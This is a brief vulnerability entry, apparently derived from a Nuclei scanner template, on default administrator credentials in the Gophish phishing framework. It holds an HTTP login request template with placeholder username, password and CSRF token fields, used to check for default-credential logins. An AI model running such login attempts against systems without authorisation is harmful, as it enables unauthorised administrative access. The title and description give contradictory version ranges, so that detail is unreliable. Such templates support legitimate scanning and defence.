# Vulnerability: Gophish < v0.10.1 Default Credentials
**Classification:** CWE-522
**Source:** Nuclei Template (`gophish-default-login.yaml`)

## Description
For versions of Gophish > 0.10.1, the temporary administrator credentials are printed in the logs when you first execute the Gophish binary.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /login HTTP/1.1
Host: {{Hostname}}

POST /login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

username={{user}}&password={{pass}}&csrf_token={{replace(url_encode(html_unescape(csrf_token)), "+", "%2B")}}
```

